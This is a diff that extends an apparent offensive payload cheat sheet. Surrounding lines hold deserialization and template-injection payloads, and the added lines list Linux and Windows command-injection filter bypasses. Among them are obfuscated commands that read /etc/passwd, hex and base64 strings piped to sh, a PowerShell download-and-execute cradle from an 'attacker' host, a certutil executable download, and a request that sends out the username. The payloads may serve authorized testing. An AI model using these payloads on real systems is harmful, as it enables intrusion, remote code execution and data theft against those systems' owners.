@@ -59,3 +59,27 @@ ysoserial.net -g TypeConfuseDelegate -f LosFormatter -c 'curl http://<collab>/'
 {{ _self.env.registerUndefinedFilterCallback("exec") }}{{ _self.env.getFilter("id") }}
 {{7*7}}
 | id
+# ─── Linux command-injection space + keyword bypasses (skraft9/vulnerability-research) ───
+# space alternatives when %20 filtered:
+cat${IFS}/etc/passwd
+cat</etc/passwd
+{cat,/etc/passwd}
+# wildcard binary lookups when full paths filtered:
+/???/??t /etc/pa??wd
+/bin/c?? /etc/pa??wd
+/usr/bin/c?t /etc/passwd
+# hex echo pipe (bypasses static-string filters):
+echo -e '\x2f\x62\x69\x6e\x2f\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64' | sh
+echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | sh
+# keyword-split so 'cat' doesn't appear literally:
+c'a't /etc/passwd
+c"a"t /etc/passwd
+\c\a\t /etc/passwd
+a=c;b=at;$a$b /etc/passwd
+${SHELL:0:1}at${IFS}/etc/passwd
+# ─── Windows caret + PowerShell string-concat bypass ───
+c^a^t C:\Windows\win.ini
+p^ow^er^she^ll -c ("iex" + " (New-Object Net.WebClient).DownloadString('http://attacker/x.ps1')")
+# ─── OOB via cert utilities ───
+certutil -urlcache -f http://attacker/x.exe %TEMP%\x.exe
+powershell -c "Invoke-WebRequest http://attacker/e?u=$env:USERNAME"
